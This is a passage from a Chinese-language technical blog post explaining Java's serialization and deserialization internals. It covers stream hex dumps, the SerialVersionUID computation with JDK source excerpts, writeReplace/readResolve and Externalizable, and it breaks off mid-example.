<h3 id="让我们把这个对象再改复杂些："><a href="#让我们把这个对象再改复杂些：" class="headerlink" title="让我们把这个对象再改复杂些："></a>让我们把这个对象再改复杂些：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SerializationSuperClass</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String superField;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SerializationComponentClass</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String componentField;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationDemo</span> <span class="keyword">extends</span> <span class="title class_">SerializationSuperClass</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> SerializationComponentClass component;</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>它序列化后的二进制串大家可以自行消化理解一下，注意其中的嵌套对象，以及<code>0x71</code>表示的<code>Reference</code>类型标识 <em>（形式上与JVM的常量池类似，用于非原始数据类型的引用对象池索引，这个引用对象池在序列化和反序列化创建时的元素填充顺序会保持一致）</em> ：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ac ed 00 05 73 72 00 11  53 65 72 69 61 6c 69 7a    ....sr.. Serializ</span><br><span class="line">61 74 69 6f 6e 44 65 6d  6f 1a 7f cd d3 53 6f 6b    ationDem o....Sok</span><br><span class="line">15 02 00 03 49 00 08 69  6e 74 46 69 65 6c 64 4c    ....I..i ntFieldL</span><br><span class="line">00 09 63 6f 6d 70 6f 6e  65 6e 74 74 00 1d 4c 53    ..compon entt..LS</span><br><span class="line">65 72 69 61 6c 69 7a 61  74 69 6f 6e 43 6f 6d 70    erializa tionComp</span><br><span class="line">6f 6e 65 6e 74 43 6c 61  73 73 3b 4c 00 0b 73 74    onentCla ss;L..st</span><br><span class="line">72 69 6e 67 46 69 65 6c  64 74 00 12 4c 6a 61 76    ringFiel dt..Ljav</span><br><span class="line">61 2f 6c 61 6e 67 2f 53  74 72 69 6e 67 3b 78 72    a/lang/S tring;xr</span><br><span class="line">00 17 53 65 72 69 61 6c  69 7a 61 74 69 6f 6e 53    ..Serial izationS</span><br><span class="line">75 70 65 72 43 6c 61 73  73 de c6 50 b7 d1 2f a3    uperClas s..P../.</span><br><span class="line">27 02 00 01 4c 00 0a 73  75 70 65 72 46 69 65 6c    &#x27;...L..s uperFiel</span><br><span class="line">64 71 00 7e 00 02 78 70  70 00 01 7d f1 73 72 00    dq.~..xp p..&#125;.sr.</span><br><span class="line">1b 53 65 72 69 61 6c 69  7a 61 74 69 6f 6e 43 6f    .Seriali zationCo</span><br><span class="line">6d 70 6f 6e 65 6e 74 43  6c 61 73 73 3c 76 ba b7    mponentC lass&lt;v..</span><br><span class="line">dd 9e 76 c4 02 00 01 4c  00 0e 63 6f 6d 70 6f 6e    ..v....L ..compon</span><br><span class="line">65 6e 74 46 69 65 6c 64  71 00 7e 00 02 78 70 70    entField q.~..xpp</span><br><span class="line">74 00 05 67 79 79 79 79                             t..gyyyy</span><br></pre></td></tr></table></figure></div>

<p>简单的分析一下序列化的执行流程：</p>
<ol>
<li><code>ObjectOutputStream</code>实例初始化时，将魔术头和版本号写入<code>bout</code> <em>（<code>BlockDataOutputStream</code>类型）</em> 中</li>
<li>调用<code>ObjectOutputStream.writeObject()</code>开始写对象数据<ul>
<li><code>ObjectStreamClass.lookup()</code>封装待序列化的类描述 <em>（返回<code>ObjectStreamClass</code>类型）</em> ，获取包括类名、自定义<code>serialVersionUID</code>、可序列化字段 <em>（返回<code>ObjectStreamField</code>类型）</em> 和构造方法，以及<code>writeObject</code>、<code>readObject</code>方法等</li>
<li><code>writeOrdinaryObject()</code>写入对象数据<ul>
<li>写入对象类型标识</li>
<li><code>writeClassDesc()</code>进入分支<code>writeNonProxyDesc()</code>写入类描述数据<ul>
<li>写入类描述符标识</li>
<li>写入类名</li>
<li>写入SUID <em>（当SUID为空时，会进行计算并赋值，细节见下面关于SerialVersionUID章节）</em></li>
<li>计算并写入序列化属性标志位</li>
<li>写入字段信息数据</li>
<li>写入Block Data结束标识</li>
<li>写入父类描述数据</li>
</ul>
</li>
<li><code>writeSerialData()</code>写入对象的序列化数据<ul>
<li>若类自定义了<code>writeObject()</code>，则调用该方法写对象，否则调用<code>defaultWriteFields()</code>写入对象的字段数据 <em>（若是非原始类型，则递归处理子对象）</em></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<hr>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="继续用简单的示例来看看反序列化："><a href="#继续用简单的示例来看看反序列化：" class="headerlink" title="继续用简单的示例来看看反序列化："></a>继续用简单的示例来看看反序列化：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">byte</span>[] data; <span class="comment">// read from file or request</span></span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">bin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(data);</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bin);</span><br><span class="line">    <span class="type">SerializationDemo</span> <span class="variable">demo</span> <span class="operator">=</span> (SerializationDemo) in.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>它的执行流程如下：</p>
<ol>
<li><code>ObjectInputStream</code>实例初始化时，读取魔术头和版本号进行校验</li>
<li>调用<code>ObjectInputStream.readObject()</code>开始读对象数据<ul>
<li>读取对象类型标识</li>
<li><code>readOrdinaryObject()</code>读取数据对象<ul>
<li><code>readClassDesc()</code>读取类描述数据<ul>
<li>读取类描述符标识，进入分支<code>readNonProxyDesc()</code></li>
<li>读取类名</li>
<li>读取SUID</li>
<li>读取并分解序列化属性标志位</li>
<li>读取字段信息数据</li>
<li><code>resolveClass()</code>根据类名获取待反序列化的类的<code>Class</code>对象，如果获取失败，则抛出<code>ClassNotFoundException</code></li>
<li><code>skipCustomData()</code>循环读取字节直到Block Data结束标识为止</li>
<li>读取父类描述数据</li>
<li><code>initNonProxy()</code>中判断对象与本地对象的SUID和类名 <em>（不含包名）</em> 是否相同，若不同，则抛出<code>InvalidClassException</code></li>
</ul>
</li>
<li><code>ObjectStreamClass.newInstance()</code>获取并调用离对象最近的非<code>Serializable</code>的父类的无参构造方法 <em>（若不存在，则返回<code>null</code>）</em> 创建对象实例</li>
<li><code>readSerialData()</code>读取对象的序列化数据<ul>
<li>若类自定义了<code>readObject()</code>，则调用该方法读对象，否则调用<code>defaultReadFields()</code>读取并填充对象的字段数据</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<hr>
<h3 id="关于SerialVersionUID"><a href="#关于SerialVersionUID" class="headerlink" title="关于SerialVersionUID"></a>关于SerialVersionUID</h3><p>在Java的序列化机制中，SUID占据着很重要的位置，它相当于一个<code>对象的指纹信息</code>，可以直接决定反序列化的成功与否，通过上面对序列化和反序列化流程的分析也可以看出来，若SUID不一致，是无法反序列化成功的。</p>
<p>但是，SUID到底是如何生成的，它的指纹信息维度包括对象的哪些内容，可能还是有很多同学不太清楚。这里我们对照 <a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/class.html#a4100">官方文档</a> 的说明，结合JDK的源代码来为大家简单的梳理一下。</p>
<p>首先<code>ObjectStreamClass.getSerialVersionUID()</code>在获取SUID时，会判断SUID是否已经存在，若不存在才调用<code>computeDefaultSUID()</code>计算默认的SUID：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">long</span> <span class="title function_">getSerialVersionUID</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (suid == <span class="literal">null</span>) &#123;</span><br><span class="line">        suid = AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Long&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> Long <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> computeDefaultSUID(cl);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> suid.longValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>先顺带提一嘴，<code>AccessController.doPrivileged()</code>会忽略JRE配置的安全策略的检查，以特权的身份去执行<code>PrivilegedAction</code>接口中的<code>run()</code>，可以防止JDK底层在进行序列化和反序列化时可能出现的一些权限问题。这些内容与本文主题无关，不多作详细解释，感兴趣的同学可以去看看Java的Security包和其中的java.policy、java.security文件内容。</p>
<p>重点来了，计算SUID时，会先创建一个<code>DataOutputStream</code>对象，所有二进制数据写入其包装的<code>ByteArrayOutputStream</code>中：</p>
<ol>
<li>写入类名 <em>（UTF8）</em> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">dout.writeUTF(cl.getName());</span><br></pre></td></tr></table></figure></div></li>
<li>写入类访问权限标识 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">classMods</span> <span class="operator">=</span> cl.getModifiers() &amp;</span><br><span class="line">    (Modifier.PUBLIC | Modifier.FINAL |</span><br><span class="line">        Modifier.INTERFACE | Modifier.ABSTRACT);</span><br><span class="line"></span><br><span class="line">Method[] methods = cl.getDeclaredMethods();</span><br><span class="line"><span class="keyword">if</span> ((classMods &amp; Modifier.INTERFACE) != <span class="number">0</span>) &#123;</span><br><span class="line">    classMods = (methods.length &gt; <span class="number">0</span>) ?</span><br><span class="line">        (classMods | Modifier.ABSTRACT) :</span><br><span class="line">        (classMods &amp; ~Modifier.ABSTRACT);</span><br><span class="line">&#125;</span><br><span class="line">dout.writeInt(classMods);</span><br></pre></td></tr></table></figure></div></li>
<li>如果不是数组类型，写入实现接口的接口名，按接口名排序 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!cl.isArray()) &#123;</span><br><span class="line">    Class&lt;?&gt;[] interfaces = cl.getInterfaces();</span><br><span class="line">    String[] ifaceNames = <span class="keyword">new</span> <span class="title class_">String</span>[interfaces.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; interfaces.length; i++) &#123;</span><br><span class="line">        ifaceNames[i] = interfaces[i].getName();</span><br><span class="line">    &#125;</span><br><span class="line">    Arrays.sort(ifaceNames);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; ifaceNames.length; i++) &#123;</span><br><span class="line">        dout.writeUTF(ifaceNames[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li>写入非私有静态或瞬态字段信息数据，包括字段名、字段访问权限标识和字段签名，按字段名排序 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Field[] fields = cl.getDeclaredFields();</span><br><span class="line">MemberSignature[] fieldSigs = <span class="keyword">new</span> <span class="title class_">MemberSignature</span>[fields.length];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">    fieldSigs[i] = <span class="keyword">new</span> <span class="title class_">MemberSignature</span>(fields[i]);</span><br><span class="line">&#125;</span><br><span class="line">Arrays.sort(fieldSigs, <span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;MemberSignature&gt;() &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ms1.name.compareTo(ms2.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fieldSigs.length; i++) &#123;</span><br><span class="line">    <span class="type">MemberSignature</span> <span class="variable">sig</span> <span class="operator">=</span> fieldSigs[i];</span><br><span class="line">    <span class="type">int</span> <span class="variable">mods</span> <span class="operator">=</span> sig.member.getModifiers() &amp;</span><br><span class="line">        (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">            Modifier.STATIC | Modifier.FINAL | Modifier.VOLATILE |</span><br><span class="line">            Modifier.TRANSIENT);</span><br><span class="line">    <span class="keyword">if</span> (((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) ||</span><br><span class="line">        ((mods &amp; (Modifier.STATIC | Modifier.TRANSIENT)) == <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        dout.writeUTF(sig.name);</span><br><span class="line">        dout.writeInt(mods);</span><br><span class="line">        dout.writeUTF(sig.signature);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li>如果存在类初始化器 <em>（不是类实例化的构造方法，感兴趣的同学可以去看看JVM规范中的相关内容）</em> ，写入固定的初始化器信息数据 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (hasStaticInitializer(cl)) &#123;</span><br><span class="line">    dout.writeUTF(<span class="string">&quot;&lt;clinit&gt;&quot;</span>);</span><br><span class="line">    dout.writeInt(Modifier.STATIC);</span><br><span class="line">    dout.writeUTF(<span class="string">&quot;()V&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li>写入非私有构造方法信息数据，包括方法名 <em>（固定为<code>&lt;init&gt;</code>）</em> 、方法访问权限标识和方法签名 <em>（分隔符<code>/</code>会替换成<code>.</code>的包名形式）</em> ，按方法签名排序 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;?&gt;[] cons = cl.getDeclaredConstructors();</span><br><span class="line">MemberSignature[] consSigs = <span class="keyword">new</span> <span class="title class_">MemberSignature</span>[cons.length];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; cons.length; i++) &#123;</span><br><span class="line">    consSigs[i] = <span class="keyword">new</span> <span class="title class_">MemberSignature</span>(cons[i]);</span><br><span class="line">&#125;</span><br><span class="line">Arrays.sort(consSigs, <span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;MemberSignature&gt;() &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ms1.signature.compareTo(ms2.signature);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; consSigs.length; i++) &#123;</span><br><span class="line">    <span class="type">MemberSignature</span> <span class="variable">sig</span> <span class="operator">=</span> consSigs[i];</span><br><span class="line">    <span class="type">int</span> <span class="variable">mods</span> <span class="operator">=</span> sig.member.getModifiers() &amp;</span><br><span class="line">        (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">            Modifier.STATIC | Modifier.FINAL |</span><br><span class="line">            Modifier.SYNCHRONIZED | Modifier.NATIVE |</span><br><span class="line">            Modifier.ABSTRACT | Modifier.STRICT);</span><br><span class="line">    <span class="keyword">if</span> ((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) &#123;</span><br><span class="line">        dout.writeUTF(<span class="string">&quot;&lt;init&gt;&quot;</span>);</span><br><span class="line">        dout.writeInt(mods);</span><br><span class="line">        dout.writeUTF(sig.signature.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li>写入非私有方法，包括方法名、方法访问权限标识和方法签名，按方法名和方法签名排序 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">MemberSignature[] methSigs = <span class="keyword">new</span> <span class="title class_">MemberSignature</span>[methods.length];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; methods.length; i++) &#123;</span><br><span class="line">    methSigs[i] = <span class="keyword">new</span> <span class="title class_">MemberSignature</span>(methods[i]);</span><br><span class="line">&#125;</span><br><span class="line">Arrays.sort(methSigs, <span class="keyword">new</span> <span class="title class_">Comparator</span>&lt;MemberSignature&gt;() &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">comp</span> <span class="operator">=</span> ms1.name.compareTo(ms2.name);</span><br><span class="line">        <span class="keyword">if</span> (comp == <span class="number">0</span>) &#123;</span><br><span class="line">            comp = ms1.signature.compareTo(ms2.signature);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> comp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; methSigs.length; i++) &#123;</span><br><span class="line">    <span class="type">MemberSignature</span> <span class="variable">sig</span> <span class="operator">=</span> methSigs[i];</span><br><span class="line">    <span class="type">int</span> <span class="variable">mods</span> <span class="operator">=</span> sig.member.getModifiers() &amp;</span><br><span class="line">        (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">            Modifier.STATIC | Modifier.FINAL |</span><br><span class="line">            Modifier.SYNCHRONIZED | Modifier.NATIVE |</span><br><span class="line">            Modifier.ABSTRACT | Modifier.STRICT);</span><br><span class="line">    <span class="keyword">if</span> ((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) &#123;</span><br><span class="line">        dout.writeUTF(sig.name);</span><br><span class="line">        dout.writeInt(mods);</span><br><span class="line">        dout.writeUTF(sig.signature.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ol>
<p>以上就是SUID中包含的类的所有信息，得到的二进制串如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 11 53 65 72 69 61 6c  69 7a 61 74 69 6f 6e 44    ..Serial izationD</span><br><span class="line">65 6d 6f 00 00 00 01 00  14 6a 61 76 61 2e 69 6f    emo..... .java.io</span><br><span class="line">2e 53 65 72 69 61 6c 69  7a 61 62 6c 65 00 08 69    .Seriali zable..i</span><br><span class="line">6e 74 46 69 65 6c 64 00  00 00 02 00 01 49 00 0b    ntField. .....I..</span><br><span class="line">73 74 72 69 6e 67 46 69  65 6c 64 00 00 00 02 00    stringFi eld.....</span><br><span class="line">12 4c 6a 61 76 61 2f 6c  61 6e 67 2f 53 74 72 69    .Ljava/l ang/Stri</span><br><span class="line">6e 67 3b 00 06 3c 69 6e  69 74 3e 00 00 00 01 00    ng;..&lt;in it&gt;.....</span><br><span class="line">16 28 4c 6a 61 76 61 2e  6c 61 6e 67 2e 53 74 72    .(Ljava. lang.Str</span><br><span class="line">69 6e 67 3b 49 29 56 00  04 6d 61 69 6e 00 00 00    ing;I)V. .main...</span><br><span class="line">09 00 16 28 5b 4c 6a 61  76 61 2e 6c 61 6e 67 2e    ...([Lja va.lang.</span><br><span class="line">53 74 72 69 6e 67 3b 29  56                         String;)V</span><br></pre></td></tr></table></figure></div>

<p>最后，将二进制数据通过SHA1算法得到摘要，取前8位按BigEndian的字节顺序转换成长整型：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> Math.min(hashBytes.length, <span class="number">8</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">    hash = (hash &lt;&lt; <span class="number">8</span>) | (hashBytes[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>返回的<code>hash</code>就是最终的SUID了。</p>
<p>由此可知，当父类或非原始数据类型字段的类内部发生变更时，并不会影响当前类的SUID值，再结合之前的内容我们还可以引申出两个结论：</p>
<ol>
<li>若当前类自定义了<code>readObject()</code>，在反序列化时会正常执行<code>readObject()</code>中所有<code>ObjectInputStream.defaultReadObject()</code> <em>（如果调用了的话）</em> 之前的逻辑；否则在处理到变更对象时，仍会抛出<code>InvalidClassException</code></li>
<li>由于序列化会对类的字段进行排序，并在反序列化时按顺序遍历处理，所以反序列化会正常处理字段名比变更对象类型字段『小』的其他字段</li>
</ol>
<h3 id="关于writeReplace-和readResolve"><a href="#关于writeReplace-和readResolve" class="headerlink" title="关于writeReplace()和readResolve()"></a>关于<code>writeReplace()</code>和<code>readResolve()</code></h3><p>在前面的执行流程分析中，为了突出主要逻辑，我们主观的忽略了一些内容，其中就包括了序列化的<code>invokeWriteReplace()</code>和反序列化的<code>invokeReadResolve()</code>。</p>
<p>现在就来看看它们分别有什么作用：</p>
<ul>
<li><p><code>writeReplace()</code></p>
<p>  返回一个对象，该对象为实际被序列化的对象，在原对象序列化之前被调用，替换原对象成为待序列化对象</p>
</li>
<li><p><code>readResolve()</code></p>
<p>  返回一个对象，该对象为实际反序列化的结果对象，在原对象反序列化之后被调用，不影响原对象的反序列化过程，仅替换结果</p>
</li>
</ul>
<p>再从具体示例来体会一下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationReplacementClass</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> String replacementField;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">readResolve</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SerializationReplacementClass</span>(<span class="string">&quot;resolve&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">SerializationReplacementClass</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.replacementField = s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SerializationReplacementClass</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.replacementField = <span class="string">&quot;replace&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationDemo</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">writeReplace</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SerializationReplacementClass</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// omit</span></span><br><span class="line">        <span class="type">SerializationReplacementClass</span> <span class="variable">demo</span> <span class="operator">=</span> (SerializationReplacementClass) in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>从序列化之后得到的二进制串中可以看到目标对象已经被替换成了<code>SerializationReplacementClass</code>：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ac ed 00 05 73 72 00 1d  53 65 72 69 61 6c 69 7a    ....sr.. Serializ</span><br><span class="line">61 74 69 6f 6e 52 65 70  6c 61 63 65 6d 65 6e 74    ationRep lacement</span><br><span class="line">43 6c 61 73 73 32 71 ac  e9 c1 d3 0b 7b 02 00 01    Class2q. ....&#123;...</span><br><span class="line">4c 00 10 72 65 70 6c 61  63 65 6d 65 6e 74 46 69    L..repla cementFi</span><br><span class="line">65 6c 64 74 00 12 4c 6a  61 76 61 2f 6c 61 6e 67    eldt..Lj ava/lang</span><br><span class="line">2f 53 74 72 69 6e 67 3b  78 70 74 00 07 72 65 70    /String; xpt..rep</span><br><span class="line">6c 61 63 65                                         lace</span><br></pre></td></tr></table></figure></div>

<p>而在反序列化之后得到的对象的<code>replacementField</code>字段值则为<code>resolve</code>，但在此之前<code>readObject()</code>也会被正常调用，当时<code>replacementField</code>字段值为<code>replace</code>。</p>
<h3 id="关于Externalizable"><a href="#关于Externalizable" class="headerlink" title="关于Externalizable"></a>关于<code>Externalizable</code></h3><p><code>Serializable</code>接口还有一个比较常见的子类<code>Externalizable</code>，它比它爸爸特殊的地方就在于它需要自己实现读写方法 <em>（<code>readExternal()</code>和<code>writeExternal()</code>）</em> ，同时必须包含一个自己的无参构造方法 <em>（默认隐式的也可以）</em> 。</p>
<p>仍以示例说话：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExternalizationDemo</span> <span class="keyword">implements</span> <span class="title class_">Externalizable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String stringField;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> intField;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">writeExternal</span><span class="params">(ObjectOutput out)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        out.writeUTF(<span class="built_in">this</span>.stringField);</span><br><span class="line">        out.writeInt(<span class="built_in">this</span>.intField);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.stringField = <span class="string">&quot;hello, i&#x27;m &quot;</span> + in.readUTF();</span><br><span class="line">        <span class="built_in">this</span>.intField = in.readInt() + <span class="number">100000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    